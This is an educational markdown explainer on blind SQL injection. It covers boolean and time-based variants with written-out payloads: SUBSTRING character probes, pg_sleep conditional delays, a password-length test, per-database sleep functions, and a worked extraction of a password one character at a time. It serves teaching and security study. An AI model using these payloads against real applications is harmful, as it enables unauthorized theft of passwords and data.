# Blind SQL Injection – Simple Explanation

## What is Blind SQL Injection?

**Regular SQL injection:** You see the stolen data in the response (usernames, passwords, etc.)

**Blind SQL injection:** The application does NOT return the stolen data. You cannot see the results of your query.

---

## The Problem

In normal UNION attacks, you see:
```
administrator~password123
```

In blind SQL injection, you see:
```
Product not found
```
or
```
Internal Server Error
```
or
```
Welcome back
```

No data appears on the page.

---

## How Hackers Exploit Blind SQL Injection

Since they cannot **see** the data, they ask **TRUE or FALSE** questions instead.

### Example Questions:

| Question | Payload |
|----------|---------|
| Is the first character of the password 'a'? | `' AND SUBSTRING(password,1,1)='a' --` |
| Is the first character of the password 'b'? | `' AND SUBSTRING(password,1,1)='b' --` |
| Is the database name 'academy'? | `' AND database()='academy' --` |

---

## Two Types of Blind SQL Injection

### 1. Boolean Blind (TRUE / FALSE)

The page changes based on whether the condition is true or false.

| Condition | Response |
|-----------|----------|
| TRUE (`1=1`) | "Welcome back" or products appear |
| FALSE (`1=2`) | No products, no welcome message |

**Example:**
```sql
' AND SUBSTRING(password,1,1)='a' --
```
- If page shows "Welcome back" → First character is 'a'
- If page shows nothing → First character is NOT 'a'

Hackers try every letter until they get TRUE.

---

### 2. Time-Based Blind (Delay)

The page takes time to respond based on whether the condition is true or false.

| Condition | Response time |
|-----------|---------------|
| TRUE (`1=1`) | 5 second delay |
| FALSE (`1=2`) | Immediate response |

**Example (PostgreSQL):**
```sql
' AND CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END --
```
- If page takes 5 seconds → First character is 'a'
- If page responds immediately → First character is NOT 'a'

---

## Blind SQL Injection Flowchart

```
Cannot see data in response
    ↓
Ask TRUE/FALSE questions
    ↓
Boolean Blind: Watch for different page content
    ↓
OR
    ↓
Time-Based Blind: Watch for response delays
    ↓
Extract data one character at a time
```

---

## Example: Extracting a Password Character by Character

**Goal:** Find password "admin"

**Step 1:** Is first character 'a'?
```sql
' AND SUBSTRING(password,1,1)='a' --
```
Response: "Welcome back" → YES, first character is 'a'

**Step 2:** Is second character 'd'?
```sql
' AND SUBSTRING(password,2,1)='d' --
```
Response: "Welcome back" → YES, second character is 'd'

**Step 3:** Is third character 'm'?
```sql
' AND SUBSTRING(password,3,1)='m' --
```
Response: "Welcome back" → YES, third character is 'm'

**Step 4:** Is fourth character 'i'?
```sql
' AND SUBSTRING(password,4,1)='i' --
```
Response: "Welcome back" → YES, fourth character is 'i'

**Step 5:** Is fifth character 'n'?
```sql
' AND SUBSTRING(password,5,1)='n' --
```
Response: "Welcome back" → YES, fifth character is 'n'

**Password found:** `admin`

---

## Time-Based Example (Extracting Password Length)

```sql
' AND CASE WHEN LENGTH(password)=5 THEN pg_sleep(5) ELSE pg_sleep(0) END --
```
- 5 second delay → Password length is 5
- No delay → Password length is NOT 5

---

## Database-Specific Sleep Functions

| Database | Sleep function |
|----------|----------------|
| PostgreSQL | `pg_sleep(seconds)` |
| MySQL | `SLEEP(seconds)` |
| SQL Server | `WAITFOR DELAY '0:0:5'` |
| Oracle | `DBMS_LOCK.SLEEP(seconds)` |

---

## One Sentence Summary

Blind SQL injection steals data without seeing it – by asking TRUE/FALSE questions (Boolean) or watching for response delays (Time-Based), one character at a time.